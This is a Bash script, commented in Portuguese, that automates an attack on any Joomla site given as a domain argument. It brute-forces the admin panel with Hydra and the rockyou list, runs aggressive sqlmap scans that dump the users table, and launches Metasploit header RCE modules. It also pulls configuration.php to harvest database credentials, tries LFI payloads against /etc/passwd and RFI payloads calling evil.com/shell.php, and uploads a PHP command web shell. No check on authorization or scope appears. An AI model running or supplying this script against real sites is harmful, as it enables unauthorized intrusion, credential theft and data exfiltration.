#!/bin/bash
# Script de Exploração Joomla - Autônomo e Brutal

# Solicitar target do usuário
if [ -z "$1" ]; then
    echo "Uso: $0 <DOMINIO>"
    echo "Exemplo: $0 exemplo.com.br"
    exit 1
fi

TARGET="$1"
URL="https://$TARGET"
LOG_DIR="./logs"
RESULTS_DIR="./results"

# Cores
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${GREEN}[*] Iniciando exploração Joomla contra ${TARGET}${NC}"

mkdir -p $LOG_DIR $RESULTS_DIR

# Verificar e instalar ferramentas
check_and_install() {
    if ! command -v $1 &> /dev/null; then
        echo -e "${YELLOW}[!] $1 não encontrado. Instalando...${NC}"
        sudo apt-get update -qq
        sudo apt-get install -y $2
    fi
}

echo -e "${GREEN}[*] Verificando ferramentas...${NC}"
check_and_install "sqlmap" "sqlmap"
# wpscan é opcional (WordPress), mas pode ser útil
if ! command -v wpscan &> /dev/null; then
    echo -e "${YELLOW}[!] wpscan não encontrado (opcional)${NC}"
fi
check_and_install "nikto" "nikto"
check_and_install "dirb" "dirb"
check_and_install "gobuster" "gobuster"
check_and_install "msfconsole" "metasploit-framework"
# joomscan pode não estar disponível, tentar instalar
if ! command -v joomscan &> /dev/null; then
    echo -e "${YELLOW}[!] Tentando instalar joomscan...${NC}"
    sudo apt-get install -y joomscan 2>/dev/null || \
    git clone https://github.com/OWASP/joomscan.git /tmp/joomscan 2>/dev/null && \
    echo '#!/bin/bash' > /usr/local/bin/joomscan && \
    echo 'cd /tmp/joomscan && perl joomscan.pl "$@"' >> /usr/local/bin/joomscan && \
    chmod +x /usr/local/bin/joomscan || \
    echo -e "${YELLOW}[!] joomscan não disponível, continuando sem ele${NC}"
fi
check_and_install "curl" "curl"
check_and_install "wget" "wget"

# Wordlist
if [ ! -f "/tmp/rockyou.txt" ]; then
    sudo gunzip -c /usr/share/wordlists/rockyou.txt.gz > /tmp/rockyou.txt 2>/dev/null || \
    wget -q https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt -O /tmp/rockyou.txt
fi

# 1. RECONHECIMENTO E FINGERPRINTING
echo -e "${GREEN}[*] Fase 1: Reconhecimento e Fingerprinting${NC}"

# Joomscan
if command -v joomscan &> /dev/null; then
    echo -e "${YELLOW}[*] Executando Joomscan...${NC}"
    joomscan -u $URL -ec > $LOG_DIR/joomscan.txt 2>&1
fi

# Nikto
echo -e "${YELLOW}[*] Executando Nikto...${NC}"
nikto -h $URL -output $LOG_DIR/nikto.txt -Format txt

# 2. ENUMERAÇÃO DE DIRETÓRIOS
echo -e "${GREEN}[*] Fase 2: Enumeração de Diretórios${NC}"

# Gobuster
echo -e "${YELLOW}[*] Executando Gobuster...${NC}"
gobuster dir -u $URL -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -o $LOG_DIR/gobuster.txt 2>&1 &

# Dirb
echo -e "${YELLOW}[*] Executando Dirb...${NC}"
dirb $URL /usr/share/wordlists/dirb/common.txt -o $LOG_DIR/dirb.txt 2>&1 &

wait

# 3. BRUTE FORCE DO PAINEL ADMINISTRATIVO
echo -e "${GREEN}[*] Fase 3: Brute Force do Painel Administrativo${NC}"
ADMIN_URL="${URL}/administrator"

# Hydra para HTTP form
echo -e "${RED}[!] Iniciando brute force no painel admin...${NC}"
COMMON_USERS=("admin" "administrator" "root" "test" "user" "joomla")

for user in "${COMMON_USERS[@]}"; do
    hydra -l $user -P /tmp/rockyou.txt $TARGET http-post-form "/administrator/index.php:username=^USER^&passwd=^PASS^:Invalid username or password" -t 16 -W 1 -f -o $LOG_DIR/hydra_joomla_${user}.txt 2>&1 &
done
wait

# 4. SQLMAP - TESTE DE INJEÇÃO SQL
echo -e "${GREEN}[*] Fase 4: SQLMap - Teste de Injeção SQL${NC}"
echo -e "${RED}[!] Executando SQLMap de forma agressiva...${NC}"

# Testar múltiplos parâmetros
sqlmap -u "${URL}/index.php?option=com_content&view=article&id=1" --batch --level=5 --risk=3 --dbs --tamper=space2comment,charencode --threads=10 -o $LOG_DIR/sqlmap.txt 2>&1 &

sqlmap -u "${ADMIN_URL}/index.php" --batch --level=5 --risk=3 --forms --dbs --tamper=space2comment,charencode --threads=10 -o $LOG_DIR/sqlmap_admin.txt 2>&1 &

wait

# Se encontrar injeção, extrair dados
if grep -q "available databases" $LOG_DIR/sqlmap.txt; then
    echo -e "${GREEN}[!!!] INJEÇÃO SQL ENCONTRADA!${NC}" | tee -a $RESULTS_DIR/sql_injection.txt
    
    # Extrair databases
    sqlmap -u "${URL}/index.php?option=com_content&view=article&id=1" --batch --dbs --tamper=space2comment,charencode >> $RESULTS_DIR/sql_databases.txt 2>&1
    
    # Extrair tabelas
    sqlmap -u "${URL}/index.php?option=com_content&view=article&id=1" --batch --tables --tamper=space2comment,charencode >> $RESULTS_DIR/sql_tables.txt 2>&1
    
    # Extrair usuários
    sqlmap -u "${URL}/index.php?option=com_content&view=article&id=1" --batch -D joomla -T "#__users" --dump --tamper=space2comment,charencode >> $RESULTS_DIR/sql_users.txt 2>&1
fi

# 5. EXPLORAÇÃO DE VULNERABILIDADES CONHECIDAS
echo -e "${GREEN}[*] Fase 5: Exploração de Vulnerabilidades Conhecidas${NC}"

# Metasploit - módulos Joomla
msfconsole -q -x "
use auxiliary/scanner/http/joomla_bruteforce_login;
set RHOSTS $TARGET;
set RPORT 443;
set SSL true;
set TARGETURI /administrator;
set USERNAME admin;
set BLANK_PASSWORDS true;
set USER_AS_PASS true;
run;
use exploit/unix/webapp/joomla_http_header_rce;
set RHOSTS $TARGET;
set RPORT 443;
set SSL true;
set TARGETURI /;
run;
use exploit/multi/http/joomla_http_header_rce;
set RHOSTS $TARGET;
set RPORT 443;
set SSL true;
set TARGETURI /;
run;
exit;
" > $LOG_DIR/metasploit_joomla.txt 2>&1

# 6. EXPLORAÇÃO DE ARQUIVOS E DIRETÓRIOS SENSÍVEIS
echo -e "${GREEN}[*] Fase 6: Exploração de Arquivos Sensíveis${NC}"

SENSITIVE_FILES=(
    "/administrator/manifests/files/joomla.xml"
    "/configuration.php"
    "/administrator/configuration.php"
    "/installation/configuration.php"
    "/.htaccess"
    "/web.config"
    "/phpinfo.php"
    "/info.php"
    "/test.php"
    "/administrator/logs/error.php"
    "/tmp/joomla.log"
)

for file in "${SENSITIVE_FILES[@]}"; do
    echo -e "${YELLOW}[*] Testando: ${URL}${file}${NC}"
    curl -s -k "${URL}${file}" -o $RESULTS_DIR/$(echo $file | tr '/' '_') 2>&1
    if [ -s "$RESULTS_DIR/$(echo $file | tr '/' '_')" ]; then
        echo -e "${GREEN}[+] Arquivo encontrado: ${file}${NC}" | tee -a $RESULTS_DIR/sensitive_files.txt
    fi
done

# Tentar ler configuration.php
echo -e "${RED}[!] Tentando ler configuration.php...${NC}"
curl -s -k "${URL}/configuration.php" > $RESULTS_DIR/configuration.php 2>&1
if grep -q "public \$" $RESULTS_DIR/configuration.php; then
    echo -e "${GREEN}[!!!] configuration.php encontrado!${NC}" | tee -a $RESULTS_DIR/configuration_found.txt
    grep -E "user|password|host|db" $RESULTS_DIR/configuration.php >> $RESULTS_DIR/db_credentials.txt
fi

# 7. TESTE DE FILE INCLUSION
echo -e "${GREEN}[*] Fase 7: Teste de File Inclusion${NC}"

# LFI
LFI_PAYLOADS=(
    "?file=../../../../etc/passwd"
    "?page=../../../../etc/passwd"
    "?include=../../../../etc/passwd"
    "?view=../../../../etc/passwd"
    "?option=../../../../etc/passwd"
)

for payload in "${LFI_PAYLOADS[@]}"; do
    echo -e "${YELLOW}[*] Testando LFI: ${payload}${NC}"
    curl -s -k "${URL}/index.php${payload}" | grep -q "root:" && {
        echo -e "${GREEN}[!!!] LFI encontrado: ${payload}${NC}" | tee -a $RESULTS_DIR/lfi_vulnerabilities.txt
        curl -s -k "${URL}/index.php${payload}" > $RESULTS_DIR/lfi_$(echo $payload | tr '/' '_').txt
    }
done

# RFI
RFI_PAYLOADS=(
    "?file=http://evil.com/shell.php"
    "?page=http://evil.com/shell.php"
)

for payload in "${RFI_PAYLOADS[@]}"; do
    echo -e "${YELLOW}[*] Testando RFI: ${payload}${NC}"
    curl -s -k "${URL}/index.php${payload}" -m 5 | grep -q "evil\|shell" && {
        echo -e "${GREEN}[!!!] RFI possível: ${payload}${NC}" | tee -a $RESULTS_DIR/rfi_vulnerabilities.txt
    }
done

# 8. TESTE DE UPLOAD DE ARQUIVOS
echo -e "${GREEN}[*] Fase 8: Teste de Upload de Arquivos${NC}"

# Criar shell PHP
cat > /tmp/shell.php << 'EOFSHELL'
<?php
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
if(isset($_POST['cmd'])) {
    system($_POST['cmd']);
}
phpinfo();
?>
EOFSHELL

# Tentar upload em vários locais
UPLOAD_PATHS=(
    "/administrator/components/com_media/upload.php"
    "/components/com_media/upload.php"
    "/images/upload.php"
    "/tmp/upload.php"
)

for path in "${UPLOAD_PATHS[@]}"; do
    echo -e "${YELLOW}[*] Tentando upload em: ${path}${NC}"
    curl -X POST -F "file=@/tmp/shell.php" -k "${URL}${path}" -o $LOG_DIR/upload_$(echo $path | tr '/' '_').txt 2>&1
done

# 9. PÓS-EXPLORAÇÃO
echo -e "${GREEN}[*] Fase 9: Pós-Exploração${NC}"

# Se conseguir acesso admin ou shell
if [ -f "$RESULTS_DIR/configuration.php" ] && grep -q "password" $RESULTS_DIR/configuration.php; then
    echo -e "${GREEN}[+] Credenciais de banco encontradas!${NC}"
    DB_USER=$(grep -oP "public \$user = '\K[^']*" $RESULTS_DIR/configuration.php)
    DB_PASS=$(grep -oP "public \$password = '\K[^']*" $RESULTS_DIR/configuration.php)
    DB_HOST=$(grep -oP "public \$host = '\K[^']*" $RESULTS_DIR/configuration.php)
    DB_NAME=$(grep -oP "public \$db = '\K[^']*" $RESULTS_DIR/configuration.php)
    
    echo -e "${GREEN}[+] Tentando conectar ao banco...${NC}"
    mysql -h $DB_HOST -u $DB_USER -p"$DB_PASS" $DB_NAME -e "SELECT * FROM #__users;" > $RESULTS_DIR/joomla_users.txt 2>&1
fi

echo -e "${GREEN}[*] Exploração Joomla concluída!${NC}"
echo -e "${GREEN}[*] Logs: $LOG_DIR${NC}"
echo -e "${GREEN}[*] Resultados: $RESULTS_DIR${NC}"

